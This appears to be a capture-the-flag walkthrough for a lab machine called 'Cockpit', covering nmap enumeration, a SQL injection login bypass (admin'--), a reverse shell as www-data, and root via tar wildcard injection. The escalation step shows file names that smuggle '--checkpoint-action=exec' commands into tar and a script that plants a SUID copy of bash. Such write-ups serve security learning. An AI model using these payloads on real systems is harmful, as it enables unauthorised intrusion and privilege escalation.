# Cockpit
> SQL auth bypass + tar wildcard SUID

## Enumeration

```
nmap -sC -sV -oN nmap.txt <IP>
```

Cockpit web panel identified.

## Exploitation

Authentication bypass via SQL injection on the login form:

```
user: admin'--
pass: anything
```

Panel access → file upload or command execution.

Reverse shell obtained as www-data.

## Privilege Escalation

`tar` binary with SUID bit and periodic execution with wildcard:

```
find / -perm -4000 2>/dev/null
ls -la /usr/bin/tar
```

Creating malicious files to exploit the wildcard:

```
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh privesc.sh"
echo "cp /bin/bash /tmp/bash && chmod +s /tmp/bash" > privesc.sh
chmod +x privesc.sh
```

```
/tmp/bash -p
```

Root obtained.
